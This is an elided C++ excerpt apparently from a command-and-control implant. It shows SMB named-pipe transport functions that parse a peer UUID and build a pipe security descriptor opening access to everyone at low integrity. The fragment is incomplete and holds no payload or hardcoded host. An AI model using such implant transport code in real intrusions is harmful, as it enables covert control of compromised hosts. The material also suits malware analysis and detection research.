...
auto Transport::SmbAdd(
    ...
    CHAR* TmpUUID = (CHAR*)Self->Hp->Alloc( 36+1 );

    Mem::Copy( TmpUUID, Buffer, 36 );

    KhDbg( "parsed uuid: %s", TmpUUID );

    SmbData = (SMB_PROFILE_DATA*)Self->Hp->Alloc( sizeof( SMB_PROFILE_DATA ) );
...
auto Transport::SmbSend(
    ...
    SECURITY_ATTRIBUTES* SecAttr = (SECURITY_ATTRIBUTES*)Self->Hp->Alloc( sizeof( SECURITY_ATTRIBUTES ) );
    SECURITY_DESCRIPTOR* SecDesc = (SECURITY_DESCRIPTOR*)Self->Hp->Alloc( SECURITY_DESCRIPTOR_MIN_LENGTH );
    ...
    AllocateAndInitializeSid( &SidAuth, 1, SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0, (PSID*)&Sid );
    ...
    SetEntriesInAclA( 1, &Access, nullptr, &DAcl );

    AllocateAndInitializeSid( &SidLabel, 1, SECURITY_MANDATORY_LOW_RID, 0, 0, 0, 0, 0, 0, 0, (PSID*)&Sidl );

    InitializeSecurityDescriptor( SecDesc, SECURITY_DESCRIPTOR_REVISION );

    SetSecurityDescriptorDacl( SecDesc, TRUE, DAcl, FALSE );

    SetSecurityDescriptorSacl( SecDesc, TRUE, SAcl, FALSE );
    ...
    ConnectNamedPipe( this->Pipe.Handle, nullptr );
}
#endif